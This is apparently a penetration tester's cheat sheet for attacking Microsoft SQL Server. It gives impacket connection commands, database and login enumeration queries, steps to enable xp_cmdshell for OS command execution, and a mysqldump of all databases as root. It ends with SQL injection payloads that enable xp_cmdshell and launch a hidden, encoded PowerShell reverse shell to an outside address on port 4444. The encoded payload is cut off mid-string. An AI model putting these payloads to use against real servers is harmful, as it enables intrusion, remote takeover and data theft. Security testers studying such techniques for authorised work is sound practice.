## Installation

```
pipx install impacket
mssqlclient.py user:pass@$target -windows-auth
```
## Navigation
```sql
SELECT name FROM sys.databases;
USE <database>;
SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '<table>';
SELECT TOP 10 * FROM <table>;
```
## Enumération
```sql
SELECT @@version;
SELECT name, type_desc FROM sys.server_principals;
```
## xp_cmdshell
```sql
-- Activer
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Utiliser
EXEC xp_cmdshell 'whoami';

-- Impacket
enable_xp_cmdshell
xp_cmdshell "powershell -e <BASE64>"
```
# mysqldump
```powershell
cd C:\xampp\mysql\bin\
.\mysqldump.exe -A -u root > output.txt
```
# SQLi
```
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

'; EXEC xp_cmdshell 'powershell -nop -noni -w hidden -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA1ACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0A
```
